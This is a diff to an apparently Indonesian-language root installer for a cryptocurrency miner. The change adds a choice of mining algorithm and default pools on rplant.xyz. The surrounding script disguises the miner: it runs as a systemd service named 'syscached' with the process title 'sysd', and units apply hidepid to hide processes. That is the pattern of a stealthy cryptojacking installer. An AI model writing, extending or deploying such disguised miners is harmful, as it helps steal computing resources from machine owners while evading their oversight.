@@ -22,12 +22,13 @@ SVC="syscached"
 HIDE_UNIT="/etc/systemd/system/xcb-proc-hidepid.service"
 HIDE_DROPIN="/etc/systemd/system/${SVC}.service.d/10-hidepid.conf"
 SYSCTL_CONF="/etc/sysctl.d/99-miner-hugepages.conf"
-POOL="eu.rplant.xyz:17194"
+POOL=""
 
 TAG=""
 WALLET=""
 WORKER=""
 THREADS=""
+ALGO="conn"
 FORCE=0
 DRY=0
 NO_HUGE=0
@@ -43,7 +44,9 @@ Sumber file:
 Konfigurasi miner:
   --wallet ADDR         alamat reward; wajib bila /etc/xcb/miner.env belum ada
   --worker NAMA         nama worker (default: hostname)
-  --pool HOST:PORT      pool CONN (default: eu.rplant.xyz:17194)
+  --algo ALGO           backend: randomy | conn | bloz | zcd (default: conn)
+  --pool HOST:PORT      pool backend (default per algo: conn 17194,
+                        bloz 7170, zcd 17197 di rplant)
   --threads N           jumlah thread (default: nproc)
 
 Lainnya:
@@ -70,6 +73,7 @@ while [ $# -gt 0 ]; do
         --wallet)    [ $# -ge 2 ] || die "--wallet butuh nilai"; WALLET="$2"; shift 2 ;;
         --worker)    [ $# -ge 2 ] || die "--worker butuh nilai"; WORKER="$2"; shift 2 ;;
         --pool)      [ $# -ge 2 ] || die "--pool butuh nilai"; POOL="$2"; shift 2 ;;
+        --algo)      [ $# -ge 2 ] || die "--algo butuh nilai"; ALGO="$2"; shift 2 ;;
         --threads)   [ $# -ge 2 ] || die "--threads butuh nilai"; THREADS="$2"; shift 2 ;;
         --no-hugepages) NO_HUGE=1; shift ;;
         --force)     FORCE=1; shift ;;
@@ -81,6 +85,20 @@ done
 
 if [ "$DRY" -eq 0 ] && [ "$(id -u)" -ne 0 ]; then
     die "jalankan sebagai root: sudo $0 ..."
+fi
+
+case "$ALGO" in
+    randomy|conn|bloz|zcd) ;;
+    *) die "--algo tidak dikenal: $ALGO (pilihan: randomy, conn, bloz, zcd)" ;;
+esac
+
+# Default pool per backend kalau --pool tidak diberikan.
+if [ -z "$POOL" ]; then
+    case "$ALGO" in
+        bloz) POOL="eu.rplant.xyz:7170" ;;
+        zcd)  POOL="randomx.rplant.xyz:17197" ;;
+        *)    POOL="eu.rplant.xyz:17194" ;;
+    esac
 fi
 
 [ "$(uname -s)" = "Linux" ] || die "skrip ini hanya untuk Linux"
@@ -200,7 +218,9 @@ set -eu
 # supaya tidak ada alamat reward berbeda di antara dua variabel itu.
 CONN_ADDRESS="${WALLET%%.*}"
 export CONN_ADDRESS
-set -- -a conn --worker "$WORKER" --ui=log
+# ALGO dari miner.env memilih backend (randomy/conn/bloz/zcd). Tanpa ALGO,
+# installer ini tetap CONN seperti sebelumnya.
+set -- -a "${ALGO:-conn}" --worker "$WORKER" --ui=log
 # THREADS kosong = auto (Config memakai jumlah CPU); jangan paksa -t "".
 if [ -n "${THREADS:-}" ]; then
     set -- "$@" -t "$THREADS"
@@ -219,6 +239,7 @@ if [ -n "$WALLET" ]; then
         (
             umask 077
             cat > "$CONF" <<EOF
+ALGO=${ALGO}
 CONN_POOL=${POOL}
 WALLET=${WALLET}
 WORKER=${WORKER}
@@ -229,7 +250,7 @@ XCB_TITLE=sysd
 EOF
         )
         chmod 0600 "$CONF"
-        log "konfigurasi: ${CONF} (wallet ${WALLET}, worker ${WORKER}, ${THREADS} thread)"
+        log "konfigurasi: ${CONF} (algo ${ALGO}, pool ${POOL}, wallet ${WALLET}, worker ${WORKER}, ${THREADS} thread)"
     fi
 fi
 
